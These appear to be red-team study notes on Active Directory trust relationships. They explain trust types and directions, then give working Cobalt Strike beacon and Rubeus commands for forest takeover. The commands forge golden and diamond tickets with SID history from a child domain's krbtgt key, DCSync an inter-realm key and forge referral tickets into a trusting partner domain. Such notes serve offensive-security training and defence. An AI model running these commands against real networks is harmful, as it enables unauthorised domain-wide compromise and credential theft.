types of trusts
    parent/child: two-way transitive trust automatically created when a new domain is added to existing tree
    tree-root: two-way transitive trust automatically created when a domain is added to an existing forest
    external: one or two-way non-transitive trust that enables resource sharing b/w different domains in different forests
    forest: one or two-way transitive trust that enables resource sharing b/w forests

NOTE: security boundaries only exist at the forest level, meaning it is not possible to prevent admins in one domain
      from accesing data in another

transitivity of a trust determines whether the trust relationship extends beyond the two parties with which it was formed
    e.g. if domain A and domain B have explicit transitive trust
        and domain B and domain C have explicit transitive trust
        then domain A and domain C implicitly trust one another

trust direction enables access to resources in either one or both directions
    in this example, trust is inbound from domain A and outbound from domain C
    e.g.    domain   --direction of trust-->       domain 
              A      <--direction of acces--         C
           "trusted"                             "trusting"

information about trust relationships are stored in AD as a trusted domain object (TDO)
    these can be read by querying the trustedDomain object class
        e.g. beacon> ldapsearch (objectClass=trustedDomain)
    important attributes include...
        cn: fqdn of the domain
        flatName: netBIOS name of the domain
        trustDirection: direction of trust where...
            0 is TRUST_DIRECTION_DISABLED
            1 is TRUST_DIRECTION_INBOUND
            2 is TRUST_DIRECTION_OUTBOUND
            3 is TRUST_DIRECTION_BIDIRECTIONAL
        trustAttributes: bitwise flags that define properties on trust where...
            1 is TRUST_ATTRIBUTE_NON_TRANSITIVE
            4 is TRUST_ATTRIBUTE_QUARANTINED_DOMAIN
            8 is TRUST_ATTRIBUTE_FOREST_TRANSITIVE
            32 is TRUST_ATTRIBUTE_WITHIN_FOREST
            64 is TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL

inter-realm tickets (aka referral tickets)
    an inter-realm key is used to allow for principals to request tickets across realms
        NOTE: all parent/child trusts in a forest have the same key (transitive trust)
    if a principal wishes to access a service in a trusting realm...
        it will send a TGS-REQ to its own KDC
        the KDC will return a TGS-REP containing an inter-realm TGT (encrypted with inter-realm key rather than krbtgt secret)
        the principal uses that TGT to request access via the KDC of the trusting realm
    NOTE: once a trust has been created, the TGS of the trusting realm is registered as a principal with the trusted realm's KDC
          we can query for these trust accounts with...
            beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName

parent/child trust
    if an adversary is able to gain domain admin privs in any child domain, they can elevate to any parent domain (even domain admin for entire forest)
    this is achieved with a golden ticket with SID history (originally designed to support moving users from one domain to another)
    this ticket can be crafted entirely offline:
        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
            where...
                /aes256 is the AES hash of the child domain's krbtgt account
                /user is the user we want to impersonate
                /domain is the child domain
                /sid is the SID of the child domain
                /sids is a list of SIDs we want to include in SID history
                    NOTE: to find the parent SID we can use LDAP query
                            beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
    or this ticket can be created using the diamond technique:
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
            where...
                /tgtdeleg gets a usable TGT for current user
                /ticketuser is the user we want to impersonate
                /ticketuserid is the RID of the impersonated user
                /sids is a list of SIDs we want to include in SID history
                /krbkey is the aes256 hash of child domain's krbtgt account

inbound trusts
    if an adversary has access to a trusted domain, then they can access resources on the trusting domain
    we need to find and impersonate principals in the trusted domain that have been configured with legit access in the trusting domain
    enumerate the foreign security principals container which represent principals trusted by the trusting domain
        beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
            NOTE: this always contains 4 default values (S-1-5-4, S-1-5-9, S-1-5-11, and S-1-5-17)
                  any other values are of interest! 
    if there are additional SIDs, we should query LDAP to find out what
        beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)
    say this shows us this domain group is a member of a domain group in partner.com as well, Partner Jump Users
    now lets enumerate machines in partner.com
        beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com
    here, we can impersonate using credentials for an eligible principal then request access to the service
    but say we don't have creds, we can forge inter-realm referral tickets
        beacon> dcsync contoso.com CONTOSO\PARTNER$
            NOTE: we are hunting for the inter-realm key (NTLM)
        now we can use rubeus offline to forge a TGT
            PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
                where...
                    /user is the user to impersonate
                    /domain is the fqdn of the trusted domain
                    /sid is the SID of the trusted domain
                    /id is the RID of the impersonated user
                    /groups are the RIDs of impersonated user's domain groups (Domain Users is 513, Workstation Admins is 1106, and Partner Jump Users is 6102)
                    /service is the krbtgt service of the trusting domain
                    /rc4 is the NTLM inter-realm key value
        now we request service tickets from the trusting domain 
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TGT] /nowrap
                where...
                    /service is the target service in the trusting domain
                    /dc is the domain controller in the trusting domain
                    /ticket is the inter-realm TGT
                    
